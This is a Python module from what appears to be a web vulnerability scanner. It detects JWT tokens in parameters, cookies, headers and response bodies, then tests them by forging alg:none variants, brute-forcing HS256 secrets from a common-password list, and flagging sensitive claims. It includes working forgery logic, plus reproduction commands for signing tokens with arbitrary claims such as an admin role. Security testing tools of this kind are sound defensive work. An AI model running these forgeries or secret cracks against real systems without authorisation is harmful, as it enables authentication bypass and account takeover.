"""JWT security analysis module.

Detects and attacks JWT tokens found in request parameters, cookies,
Authorization headers, or response bodies.  Checks:

    1. alg:none  -- server accepts unsigned tokens
    2. Weak HS256 secret -- brute-force against common passwords
    3. Sensitive data in payload  -- PII/secrets in JWT claims
"""

import base64
import hashlib
import hmac as _hmac
import json
import re
from typing import Dict, List, Optional, Tuple

from .base import BaseModule, Finding

# ---------------------------------------------------------------------------
# Weak secrets dictionary
# ---------------------------------------------------------------------------
_WEAK_SECRETS: List[str] = [
    "", "secret", "password", "123456", "qwerty", "admin", "test",
    "change_me", "mysecret", "jwt_secret", "jwt-secret", "secret123",
    "supersecret", "secretkey", "your-256-bit-secret", "private_key",
    "abc123", "token_secret", "app_secret", "auth_secret",
    "HS256", "key", "signing_key", "jwt_signing_key",
    "development", "production", "staging", "local", "default",
    "changeme", "iloveyou", "dragon", "master", "welcome",
    "monkey", "qwerty123", "password1", "letmein",
]

# JWT pattern: three base64url parts separated by dots
_JWT_RE = re.compile(r"\bey[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")

# Fields in JWT payload that indicate sensitive data
_SENSITIVE_FIELDS = frozenset({
    "password", "passwd", "pwd", "secret", "api_key", "apikey",
    "token", "ssn", "credit_card", "card_number", "cvv",
    "phone", "dob", "date_of_birth", "social_security",
})


# ---------------------------------------------------------------------------
# JWT helpers
# ---------------------------------------------------------------------------

def _b64url_decode(s: str) -> bytes:
    s = s.replace("-", "+").replace("_", "/")
    s += "=" * (-len(s) % 4)
    return base64.b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _decode_token(token: str) -> Optional[Dict]:
    """Parse JWT without verifying the signature.

    Returns ``{header, payload, parts}`` or ``None`` on malformed input.
    """
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return {"header": header, "payload": payload, "parts": parts}
    except Exception:
        return None


def _forge_alg_none(token: str) -> List[str]:
    """Generate alg:none variants with an empty signature."""
    parts = token.split(".")
    if len(parts) != 3:
        return []
    try:
        header = json.loads(_b64url_decode(parts[0]))
    except Exception:
        return []

    forged = []
    for alg in ("none", "None", "NONE", "nOnE"):
        h = {**header, "alg": alg}
        enc = _b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        forged.append(f"{enc}.{parts[1]}.")   # empty signature
        forged.append(f"{enc}.{parts[1]}")    # no trailing dot
    return forged


def _crack_hs256(token: str) -> Optional[str]:
    """Try common secrets against an HS256 JWT.  Returns the secret or None."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        hdr = json.loads(_b64url_decode(parts[0]))
        if hdr.get("alg", "").upper() != "HS256":
            return None
        expected = _b64url_decode(parts[2])
    except Exception:
        return None

    msg = f"{parts[0]}.{parts[1]}".encode()
    for secret in _WEAK_SECRETS:
        sig = _hmac.new(secret.encode(), msg, hashlib.sha256).digest()
        if sig == expected:
            return secret
    return None


# ---------------------------------------------------------------------------
# Module
# ---------------------------------------------------------------------------

class JWTAnalyzer(BaseModule):
    """Detect, decode, and attack JWT tokens.

    Unlike vuln-injection modules, this one scans:
      - The value of the targeted parameter (if it is a JWT).
      - Cookies, Authorization header, and body of the baseline response.
    """

    NAME = "jwt"

    def scan_parameter(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> List[Finding]:
        findings: List[Finding] = []

        # Collect (source_label, token_string) pairs to analyse
        candidates: List[Tuple[str, str]] = []

        # 1. Check if the parameter value itself is a JWT
        value = params.get(param_name, "")
        if _JWT_RE.match(value):
            candidates.append((f"param:{param_name}", value))

        # 2. Baseline request -- look in response cookies, headers, body
        resp = self.http.get(url, params=params)
        if resp is not None:
            # Set-Cookie
            for header_val in resp.headers.getlist("Set-Cookie") if hasattr(resp.headers, "getlist") else [resp.headers.get("Set-Cookie", "")]:
                m = _JWT_RE.search(header_val or "")
                if m:
                    candidates.append(("cookie", m.group(0)))

            # Authorization echo or WWW-Authenticate
            for hname in ("Authorization", "X-Auth-Token", "X-Access-Token"):
                hval = resp.headers.get(hname, "")
                m = _JWT_RE.search(hval)
                if m:
                    candidates.append((f"header:{hname}", m.group(0)))

            # Response body scan (first 15 KB)
            for m in _JWT_RE.finditer(resp.text[:15360]):
                token = m.group(0)
                if token not in {t for _, t in candidates}:
                    candidates.append(("body", token))
                    break  # one body token per scan run

        # Deduplicate by token value
        seen_tokens: set = set()
        unique: List[Tuple[str, str]] = []
        for label, token in candidates:
            if token not in seen_tokens:
                seen_tokens.add(token)
                unique.append((label, token))

        for label, token in unique:
            decoded = _decode_token(token)
            if not decoded:
                continue

            alg = decoded["header"].get("alg", "?").upper()
            payload_preview = json.dumps(decoded["payload"], separators=(",", ":"))[:200]

            # --- Check 1: alg:none ---
            if alg not in ("NONE",):
                for forged in _forge_alg_none(token):
                    test_headers = {"Authorization": f"Bearer {forged}"}
                    r = self.http.get(url, params=params, headers=test_headers)
                    if r is not None and r.status_code not in (401, 403):
                        findings.append(Finding(
                            vuln_type="JWT Algorithm None Bypass",
                            url=url,
                            method=method,
                            parameter=label,
                            payload="alg:none (unsigned token)",
                            evidence=(
                                f"Server accepted forged JWT with alg:none "
                                f"(HTTP {r.status_code})"
                            ),
                            confidence="high",
                            details=(
                                "The server does not verify JWT signatures when "
                                "alg is set to 'none'. An attacker can forge any "
                                "claims (user ID, role, admin flag) without knowing "
                                "the secret key."
                            ),
                            reproduction=(
                                "# Decode the original token payload:\n"
                                "$ python3 -c \"import base64; print("
                                "base64.b64decode('<payload_part>=='.encode()).decode())\"\n\n"
                                "# Forge with alg:none (PyJWT):\n"
                                "$ pip install PyJWT\n"
                                "$ python3 -c \"\n"
                                "import jwt\n"
                                "payload = {...}  # replace with decoded claims\n"
                                "token = jwt.encode(payload, '', algorithm='none')\n"
                                "print(token)\n\"\n\n"
                                f'$ curl -H "Authorization: Bearer <forged>" "{url}"'
                            ),
                        ))
                        break

            # --- Check 2: Weak HS256 secret ---
            if alg == "HS256":
                secret = _crack_hs256(token)
                if secret is not None:
                    secret_r = repr(secret)
                    findings.append(Finding(
                        vuln_type="JWT Weak HMAC Secret",
                        url=url,
                        method=method,
                        parameter=label,
                        payload=f"secret={secret_r}",
                        evidence=f"HS256 signing secret cracked: {secret_r}",
                        confidence="high",
                        details=(
                            f"The JWT is signed with a weak/guessable HS256 secret "
                            f"({secret_r}). An attacker can craft tokens with arbitrary "
                            f"claims by signing them with the same secret."
                        ),
                        reproduction=(
                            f"# Forge a JWT with the discovered secret:\n"
                            f"$ pip install PyJWT\n"
                            f"$ python3 -c \"\nimport jwt\n"
                            f"payload = {json.dumps(decoded['payload'])}\n"
                            f"# Modify payload as needed (e.g. role='admin')\n"
                            f"token = jwt.encode(payload, {secret_r}, algorithm='HS256')\n"
                            f"print(token)\n\""
                        ),
                    ))

            # --- Check 3: Sensitive payload fields ---
            exposed = _SENSITIVE_FIELDS & {k.lower() for k in decoded["payload"]}
            if exposed:
                findings.append(Finding(
                    vuln_type="JWT Sensitive Data Exposure",
                    url=url,
                    method=method,
                    parameter=label,
                    payload="(JWT payload decoded)",
                    evidence=f"Sensitive fields in JWT payload: {sorted(exposed)}",
                    confidence="medium",
                    details=(
                        "JWT payloads are Base64-encoded but NOT encrypted. "
                        f"Field(s) {sorted(exposed)} are readable by anyone who "
                        "intercepts the token — in transit or in browser storage."
                    ),
                    reproduction=(
                        "# Decode JWT payload (no secret needed):\n"
                        "# Copy the middle part of the token and decode:\n"
                        "$ python3 -c \"import base64; "
                        "print(base64.b64decode('<token.part2>=='.encode()).decode())\"\n\n"
                        "# Or online: https://jwt.io\n\n"
                        f"# Payload preview:\n"
                        f"# {payload_preview}"
                    ),
                ))

        return findings
